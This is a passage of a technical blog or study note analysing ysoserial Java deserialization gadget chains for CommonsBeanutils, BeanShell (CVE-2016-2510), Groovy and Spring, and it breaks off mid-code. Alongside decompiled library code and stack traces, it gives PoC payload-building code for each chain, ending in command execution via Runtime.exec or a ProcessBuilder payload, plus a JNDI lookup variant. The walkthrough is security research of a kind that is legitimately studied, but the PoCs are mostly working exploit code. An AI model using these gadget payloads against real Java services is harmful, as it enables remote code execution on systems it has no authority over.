+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">( T o1, T o2 )</span> &#123;  <br>   ...<br>	<span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty( o1, property );  <br>	<span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty( o2, property );<br>	...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>In <code>getSimpleProperty()</code> method:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getSimpleProperty</span><span class="hljs-params">(Object bean, String name)</span>&#123;<br>	...<br>	<span class="hljs-type">PropertyDescriptor</span> <span class="hljs-variable">descriptor</span> <span class="hljs-operator">=</span>  <br>        getPropertyDescriptor(bean, name);  <br>	<span class="hljs-keyword">if</span> (descriptor == <span class="hljs-literal">null</span>) &#123;  <br>	    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoSuchMethodException</span>(<span class="hljs-string">&quot;Unknown property &#x27;&quot;</span> +  <br>	            name + <span class="hljs-string">&quot;&#x27; on class &#x27;&quot;</span> + bean.getClass() + <span class="hljs-string">&quot;&#x27;&quot;</span> );  <br>	&#125;  <br>	<span class="hljs-type">Method</span> <span class="hljs-variable">readMethod</span> <span class="hljs-operator">=</span> getReadMethod(bean.getClass(), descriptor);  <br>	<span class="hljs-keyword">if</span> (readMethod == <span class="hljs-literal">null</span>) &#123;  <br>	    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoSuchMethodException</span>(<span class="hljs-string">&quot;Property &#x27;&quot;</span> + name +  <br>	            <span class="hljs-string">&quot;&#x27; has no getter method in class &#x27;&quot;</span> + bean.getClass() + <span class="hljs-string">&quot;&#x27;&quot;</span>);  <br>	&#125;  <br>	  <br>	<span class="hljs-comment">// Call the property getter and return the value  </span><br>	<span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY);<br>	...<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>In this method, firstly it creates a <code>PropertyDescriptor</code> of the input bean and gets the getter according to the property name. When the getter is invoked, our <code>TemplatesImpl</code> is ignited.</p>
+<p>Poc:<br>Note that, set the <code>property</code> member of <code>BeanComparator</code> to  <code>lowestSetBit</code> so as to successfully add initial value to queue. You can also set it to null.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(command);  <br><span class="hljs-comment">// mock method name until armed  </span><br><span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;lowestSetBit&quot;</span>);<span class="hljs-comment">// or null</span><br>  <br><span class="hljs-comment">// create queue with numbers and basic comparator  </span><br><span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, comparator);  <br><span class="hljs-comment">// stub data for replacement later  </span><br>queue.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;1&quot;</span>));  <br>queue.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;1&quot;</span>));  <br>  <br>Reflections.setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);  <br>Reflections.setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);  <br>  <br><span class="hljs-keyword">return</span> queue;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Using-JdbcRowSetImpl-CB3"><a href="#Using-JdbcRowSetImpl-CB3" class="headerlink" title="Using JdbcRowSetImpl (CB3)"></a>Using JdbcRowSetImpl (CB3)</h3><p>The <code>JdbcRowSetImpl</code> class has a property named <code>databaseMetaData</code> whose getter calls <code>connect()</code> to look up a JNDI URL.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> DatabaseMetaData <span class="hljs-title function_">getDatabaseMetaData</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;  <br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> connect();  <br>    <span class="hljs-keyword">return</span> con.getMetaData();  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Poc:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;lowestSetBit&quot;</span>);  <br><span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">rs</span>         <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();  <br>rs.setDataSourceName(jndiURL);  <br>rs.setMatchColumn(<span class="hljs-string">&quot;xx&quot;</span>);  <br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);  <br>  <br>queue.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;1&quot;</span>));  <br>queue.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;1&quot;</span>));  <br>  <br>Reflections.setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;databaseMetaData&quot;</span>);  <br>Reflections.setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;rs, rs&#125;);  <br><span class="hljs-keyword">return</span> queue;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="BeanShell"><a href="#BeanShell" class="headerlink" title="BeanShell"></a>BeanShell</h2><h3 id="BeanShell1-CVE-2016-2510"><a href="#BeanShell1-CVE-2016-2510" class="headerlink" title="BeanShell1  CVE-2016-2510"></a>BeanShell1  <a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-gxg6-rc6c-v673" title="CVE-2016-2510">CVE-2016-2510</a></h3><blockquote>
+<p>[!NOTE] pre-requirements<br>Reproduced on JDK1.8<br>org.beanshell:bsh:2.0b5 (fixed in 2.0b6)</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Gadget chain:</span><br>invokeMethod:<span class="hljs-number">233</span>, This (bsh)<br>invokeMethod:<span class="hljs-number">174</span>, This (bsh)<br>invokeImpl:<span class="hljs-number">194</span>, XThis$Handler (bsh)<br>invoke:<span class="hljs-number">131</span>, XThis$Handler (bsh)<br>compare:-<span class="hljs-number">1</span>, $Proxy5 (com.sun.proxy)<br>siftDownUsingComparator:<span class="hljs-number">721</span>, PriorityQueue (java.util)<br>siftDown:<span class="hljs-number">687</span>, PriorityQueue (java.util)<br>heapify:<span class="hljs-number">736</span>, PriorityQueue (java.util)<br>readObject:<span class="hljs-number">796</span>, PriorityQueue (java.util)<br></code></pre></td></tr></table></figure>
+
+<p>Firstly, let’s take a glance into <code>bsh.XThis</code>. It has a member named by <code>invocationHandler</code> with <code>XThis$Handler</code> type. <code>Handler</code> implements <code>InvocationHandler</code> interface and delegates methods invocation request to the method with the same signature in current namespace. To check this, step into <code>This.invokeMethod()</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invokeMethod</span><span class="hljs-params">(   </span><br><span class="hljs-params">   String methodName, Object [] args,   </span><br><span class="hljs-params">Interpreter interpreter, CallStack callstack, SimpleNode callerInfo,   </span><br><span class="hljs-params"><span class="hljs-type">boolean</span> declaredOnly  )</span>   <br>   <span class="hljs-keyword">throws</span> EvalError  <br>&#123;<br>	...<br>	Class [] types = Types.getTypes( args );  <br>	<span class="hljs-type">BshMethod</span> <span class="hljs-variable">bshMethod</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br>	<span class="hljs-keyword">try</span> &#123;  <br>	   bshMethod = namespace.getMethod( methodName, types, declaredOnly );  <br>	&#125; <span class="hljs-keyword">catch</span> ( UtilEvalError e ) &#123;  <br>	   <span class="hljs-comment">// leave null  </span><br>	&#125;  <br>	  <br>	<span class="hljs-keyword">if</span> ( bshMethod != <span class="hljs-literal">null</span> )  <br>	   <span class="hljs-keyword">return</span> bshMethod.invoke( args, interpreter, callstack, callerInfo );<br>	...<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>This means that we can extract the <code>invocationHandler</code> of a <code>XThis</code> object and build a proxy on it. When a method like <code>compare()</code> is invoked on this proxy, it would result in the invocation of the bsh method <code>compare()</code> defined in current namespace. And the <code>invocationHandler</code> does not require any modification. What we should do is to define a <code>compare()</code> method by bsh interpreter.</p>
+<p>Poc:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> BeanShellUtil.makeBeanShellPayload(command);  <br><span class="hljs-comment">// payload: compare(Object su18, Object su19) &#123;new java.lang.ProcessBuilder(new String[]&#123;&quot;calc.exe&quot;&#125;</span><br><span class="hljs-type">Interpreter</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Interpreter</span>();  <br>Reflections.getMethodAndInvoke(i, <span class="hljs-string">&quot;setu&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Object.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;bsh.cwd&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>&#125;);  <br>i.eval(payload);  <br><span class="hljs-type">XThis</span> <span class="hljs-variable">xt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XThis</span>(i.getNameSpace(), i);  <br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) Reflections.getField(xt.getClass(), <span class="hljs-string">&quot;invocationHandler&quot;</span>).get(xt);  <br>Comparator&lt;? <span class="hljs-built_in">super</span> Object&gt; comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Comparator.class&#125;, handler);  <br>PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);  <br>Object[] queue = &#123;Integer.valueOf(<span class="hljs-number">1</span>), Integer.valueOf(<span class="hljs-number">1</span>)&#125;;  <br>Reflections.setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, queue);  <br>Reflections.setFieldValue(priorityQueue, <span class="hljs-string">&quot;size&quot;</span>, Integer.valueOf(<span class="hljs-number">2</span>));  <br><span class="hljs-keyword">return</span> priorityQueue;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h2><blockquote>
+<p>[!NOTE] pre-requirements<br>Reproduced on JDK1.8<br>org.codehaus.groovy:groovy:2.3.9</p>
+</blockquote>
+<p>This gadget can use both <code>AnnotationInvocationHandler</code> or <code>PriorityQueue</code>, we use the later as example.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Gadget chain:</span><br>execute:<span class="hljs-number">530</span>, ProcessGroovyMethods (org.codehaus.groovy.runtime)<br>doMethodInvoke:-<span class="hljs-number">1</span>, dgm$<span class="hljs-number">748</span> (org.codehaus.groovy.runtime)<br>invokeMethod:<span class="hljs-number">1207</span>, MetaClassImpl (groovy.lang)<br>invokeMethod:<span class="hljs-number">1074</span>, MetaClassImpl (groovy.lang)<br>invokeMethod:<span class="hljs-number">1016</span>, MetaClassImpl (groovy.lang)<br>call:<span class="hljs-number">423</span>, Closure (groovy.lang)<br>invokeCustom:<span class="hljs-number">51</span>, ConvertedClosure (org.codehaus.groovy.runtime)<br>invoke:<span class="hljs-number">103</span>, ConversionHandler (org.codehaus.groovy.runtime)<br>entrySet:-<span class="hljs-number">1</span>, $Proxy4 (com.sun.proxy)<br>readObject:<span class="hljs-number">452</span>, AnnotationInvocationHandler (sun.reflect.annotation)<br></code></pre></td></tr></table></figure>
+
+<p>Poc:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">ConvertedClosure</span> <span class="hljs-variable">closure</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConvertedClosure</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodClosure</span>(command, <span class="hljs-string">&quot;execute&quot;</span>), <span class="hljs-string">&quot;entrySet&quot;</span>);  <br>  <br><span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> Gadgets.createProxy(closure, Map.class);  <br>  <br><span class="hljs-keyword">final</span> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> Gadgets.createMemoizedInvocationHandler(map);  <br>  <br><span class="hljs-keyword">return</span> handler;<br></code></pre></td></tr></table></figure>
+
+<p>The <code>ConvertedClosure</code> class is an <code>InvocationHandler</code> bounded to a single method, i.e. only if its bounded method can be invoked. And the invocation can be delegated to another <code>Closure</code>(here is <code>MethodClosure</code>).<br>Step into its super class <code>ConversionHandler</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>    <span class="hljs-type">VMPlugin</span> <span class="hljs-variable">plugin</span> <span class="hljs-operator">=</span> VMPluginFactory.getPlugin();  <br>    <span class="hljs-keyword">if</span> (plugin.getVersion()&gt;=<span class="hljs-number">7</span> &amp;&amp; isDefaultMethod(method)) &#123;  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">handle</span> <span class="hljs-operator">=</span> handleCache.get(method);  <br>        <span class="hljs-keyword">if</span> (handle == <span class="hljs-literal">null</span>) &#123;  <br>            handle = plugin.getInvokeSpecialHandle(method, proxy);  <br>            handleCache.put(method, handle);  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> plugin.invokeHandle(handle, args);  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">if</span> (!checkMethod(method)) &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-keyword">return</span> invokeCustom(proxy, method, args);  <br>        &#125; <span class="hljs-keyword">catch</span> (GroovyRuntimeException gre) &#123;  <br>            <span class="hljs-keyword">throw</span> ScriptBytecodeAdapter.unwrap(gre);  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-built_in">this</span>, args);  <br>    &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ite) &#123;  <br>        <span class="hljs-keyword">throw</span> ite.getTargetException();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>We should make control dive into <code>invokeCustom()</code>.<br>Look at <code>ConvertedClosure</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invokeCustom</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span>  <br><span class="hljs-keyword">throws</span> Throwable &#123;  <br>    <span class="hljs-keyword">if</span> (methodName!=<span class="hljs-literal">null</span> &amp;&amp; !methodName.equals(method.getName())) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>    <span class="hljs-keyword">return</span> ((Closure) getDelegate()).call(args);  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>In <code>MethodClosure</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">doCall</span><span class="hljs-params">(Object arguments)</span> &#123;<br>    <span class="hljs-keyword">return</span> InvokerHelper.invokeMethod(getOwner(), method, arguments);  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Finally, in <code>ProcessGroovyMethods</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Process <span class="hljs-title function_">execute</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String self)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>    <span class="hljs-keyword">return</span> Runtime.getRuntime().exec(self);  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p>So the whole procedure is:<br>deserialize <code>AnnotationInvocationHandler</code>  &#x3D;&gt;<br><code>entrySet()</code> is called upon <code>ConvertedClosure</code> &#x3D;&gt;<br>delegate to <code>MethodClosure</code> &#x3D;&gt;<br>call groovy integrated method <code>execute()</code></p>
+<p>End.</p>
+<h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><h3 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h3><blockquote>
+<p>[!NOTE] pre-requirements<br>JDK1.7<br>org.springframework:spring-core:4.1.4.RELEASE</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Gadget chain:</span><br><br>ObjectInputStream.readObject()<br>	SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()<br>		SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>			AnnotationInvocationHandler.invoke()<br>				HashMap.get()<br>		ReflectionUtils.findMethod()<br>		SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>			AnnotationInvocationHandler.invoke()<br>				HashMap.get()<br>		ReflectionUtils.invokeMethod()<br>			Method.invoke()<br>				Templates(Proxy).newTransformer()<br>					AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()<br>						ObjectFactory(Proxy).getObject()<br>							AnnotationInvocationHandler.invoke()<br>								HashMap.get()<br>						Method.invoke()<br>							TemplatesImpl.newTransformer()<br>								TemplatesImpl.getTransletInstance()<br>									TemplatesImpl.defineTransletClasses()<br>										TemplatesImpl.TransletClassLoader.defineClass()<br>											Pwner*(Javassist-generated).&lt;<span class="hljs-keyword">static</span> init&gt;<br>												Runtime.exec()<br></code></pre></td></tr></table></figure>
+
+<h4 id="AnnotationInvocationHandler-special-functionality"><a href="#AnnotationInvocationHandler-special-functionality" class="headerlink" title="AnnotationInvocationHandler special functionality"></a>AnnotationInvocationHandler special functionality</h4><p>The <code>AnnotationInvocationHandler</code> class is able to overwrite a proxied method, return the designated value when call it. We can look at its <code>invoke()</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>	...<br>	<span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br>	...<br>	<span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>And <code>memberValues</code> is built within <code>readObject()</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>    ...<br>    Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="hljs-string">&quot;memberValues&quot;</span>, <span class="hljs-literal">null</span>);<br>    ...<br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;<br>	    ...<br>	    mv.put(name, value);<br>	    ...<br>	&#125;<br>	UnsafeAccessor.setMemberValues(<span class="hljs-built_in">this</span>, mv);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>There is an constraint that the type of <code>memberValues</code> should equals to that of the return type of the method to be hooked.</p>
+<h4 id="Kick-off-MethodInvokeTypeProvider"><a href="#Kick-off-MethodInvokeTypeProvider" class="headerlink" title="Kick-off : MethodInvokeTypeProvider"></a>Kick-off : MethodInvokeTypeProvider</h4><p><code>MethodInvokeTypeProvider</code> class is an inner class of <code>org.springframework.core.SerializableTypeWrapper</code>. In its <code>readObject()</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <br>   inputStream.defaultReadObject();  <br>   <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(<span class="hljs-built_in">this</span>.provider.getType().getClass(), <span class="hljs-built_in">this</span>.methodName);  <br>   <span class="hljs-built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="hljs-built_in">this</span>.provider.getType());  <br>&#125;<br></code></pre></td></tr></table></figure>
+<p>If we can control <code>methodName</code> and <code>provider.getType()</code>, then we can execute any code.<br>By using the measure introduced [[Java Deserialize Vulnerabilities ysoserial study#AnnotationInvocationHandler special functionality|here]], we can hook <code>getType()</code> to return an object in <code>Type</code> class. It is expected to get a <code>TemplatesImpl</code> when call <code>getType()</code> and invoke its <code>newTransformer()</code>. So we need to introduce <code>ObjectFactoryDelegatingInvocationHandler</code>.</p>
+<h4 id="ObjectFactoryDelegatingInvocationHandler"><a href="#ObjectFactoryDelegatingInvocationHandler" class="headerlink" title="ObjectFactoryDelegatingInvocationHandler"></a>ObjectFactoryDelegatingInvocationHandler</h4><p>It is an inner class of <code>org.springframework.beans.factory.support.AutowireUtils</code>. It is an <code>InvocationHandler</code>. Let’s look at its <code>invoke()</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>    <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> method.getName();  <br>    <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;equals&quot;</span>)) &#123;  <br>        <span class="hljs-keyword">return</span> proxy == args[<span class="hljs-number">0</span>];  <br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;hashCode&quot;</span>)) &#123;  <br>        <span class="hljs-keyword">return</span> System.identityHashCode(proxy);  <br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;toString&quot;</span>)) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.objectFactory.toString();  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-built_in">this</span>.objectFactory.getObject(), args);  <br>        &#125; <span 